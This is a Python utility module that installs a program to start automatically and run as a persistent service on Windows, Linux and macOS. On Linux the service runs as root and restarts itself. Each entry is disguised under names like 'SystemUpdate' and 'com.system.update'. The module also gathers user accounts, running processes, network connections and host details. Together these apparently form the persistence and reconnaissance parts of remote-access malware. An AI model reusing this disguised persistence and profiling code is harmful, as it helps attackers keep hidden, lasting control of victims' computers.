import os
import sys
import platform
import subprocess
import psutil
import socket
from pathlib import Path

class PlatformUtils:
    @staticmethod
    def get_os_type():
        """Get the current operating system type."""
        return platform.system().lower()

    @staticmethod
    def is_windows():
        """Check if running on Windows."""
        return PlatformUtils.get_os_type() == 'windows'

    @staticmethod
    def is_linux():
        """Check if running on Linux."""
        return PlatformUtils.get_os_type() == 'linux'

    @staticmethod
    def is_macos():
        """Check if running on macOS."""
        return PlatformUtils.get_os_type() == 'darwin'

    @staticmethod
    def get_startup_path():
        """Get the appropriate startup path for the current OS."""
        if PlatformUtils.is_windows():
            return os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif PlatformUtils.is_linux():
            return os.path.expanduser('~/.config/autostart')
        elif PlatformUtils.is_macos():
            return os.path.expanduser('~/Library/LaunchAgents')
        return None

    @staticmethod
    def get_service_path():
        """Get the appropriate service path for the current OS."""
        if PlatformUtils.is_windows():
            return os.path.join(os.getenv('SystemRoot'), 'System32')
        elif PlatformUtils.is_linux():
            return '/etc/systemd/system'
        elif PlatformUtils.is_macos():
            return '/Library/LaunchDaemons'
        return None

    @staticmethod
    def add_to_startup(executable_path):
        """Add the application to startup based on the current OS."""
        try:
            if PlatformUtils.is_windows():
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, executable_path)
                winreg.CloseKey(key)
                return True, "Added to Windows startup registry"

            elif PlatformUtils.is_linux():
                startup_dir = PlatformUtils.get_startup_path()
                os.makedirs(startup_dir, exist_ok=True)
                desktop_file = os.path.join(startup_dir, "system-update.desktop")
                with open(desktop_file, 'w') as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=System Update
Exec={executable_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
                return True, "Added to Linux autostart"

            elif PlatformUtils.is_macos():
                startup_dir = PlatformUtils.get_startup_path()
                os.makedirs(startup_dir, exist_ok=True)
                plist_file = os.path.join(startup_dir, "com.system.update.plist")
                with open(plist_file, 'w') as f:
                    f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{executable_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")
                return True, "Added to macOS startup"

            return False, "Unsupported operating system"

        except Exception as e:
            return False, f"Error adding to startup: {str(e)}"

    @staticmethod
    def install_as_service(executable_path):
        """Install the application as a service based on the current OS."""
        try:
            if PlatformUtils.is_windows():
                service_name = "SystemUpdate"
                service_cmd = f'sc create {service_name} binPath= "{executable_path}" start= auto'
                subprocess.run(service_cmd, shell=True, check=True)
                return True, "Installed as Windows service"

            elif PlatformUtils.is_linux():
                service_file = os.path.join(PlatformUtils.get_service_path(), "system-update.service")
                with open(service_file, 'w') as f:
                    f.write(f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={executable_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
""")
                subprocess.run(["systemctl", "daemon-reload"], check=True)
                subprocess.run(["systemctl", "enable", "system-update.service"], check=True)
                subprocess.run(["systemctl", "start", "system-update.service"], check=True)
                return True, "Installed as Linux service"

            elif PlatformUtils.is_macos():
                service_file = os.path.join(PlatformUtils.get_service_path(), "com.system.update.plist")
                with open(service_file, 'w') as f:
                    f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{executable_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
""")
                subprocess.run(["launchctl", "load", service_file], check=True)
                return True, "Installed as macOS service"

            return False, "Unsupported operating system"

        except Exception as e:
            return False, f"Error installing service: {str(e)}"

    @staticmethod
    def get_system_info():
        """Get system information in a platform-agnostic way."""
        info = {
            'platform': platform.system(),
            'platform_version': platform.version(),
            'hostname': platform.node(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'cpu_count': psutil.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory': dict(psutil.virtual_memory()._asdict()),
            'disk': dict(psutil.disk_usage('/')._asdict()),
            'network': dict(psutil.net_io_counters()._asdict()),
            'users': PlatformUtils.get_users(),
            'processes': PlatformUtils.get_processes(),
            'connections': PlatformUtils.get_network_connections()
        }
        return info

    @staticmethod
    def get_users():
        """Get user information in a platform-agnostic way."""
        users = []
        try:
            if PlatformUtils.is_windows():
                import wmi
                wmi_obj = wmi.WMI()
                for user in wmi_obj.Win32_UserAccount():
                    users.append({
                        'name': user.Name,
                        'fullname': user.FullName,
                        'disabled': user.Disabled,
                        'sid': user.SID
                    })
            else:
                import pwd
                for user in pwd.getpwall():
                    users.append({
                        'name': user.pw_name,
                        'uid': user.pw_uid,
                        'gid': user.pw_gid,
                        'home': user.pw_dir,
                        'shell': user.pw_shell
                    })
        except Exception:
            pass
        return users

    @staticmethod
    def get_processes():
        """Get process information in a platform-agnostic way."""
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
            try:
                processes.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return processes

    @staticmethod
    def get_network_connections():
        """Get network connections in a platform-agnostic way."""
        connections = []
        for conn in psutil.net_connections():
            try:
                connections.append({
                    'local_addr': f"{conn.laddr.ip}:{conn.laddr.port}",
                    'remote_addr': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                    'status': conn.status,
                    'pid': conn.pid
                })
            except:
                pass
        return connections

    @staticmethod
    def get_local_ip():
        """Get local IP address in a platform-agnostic way."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1" 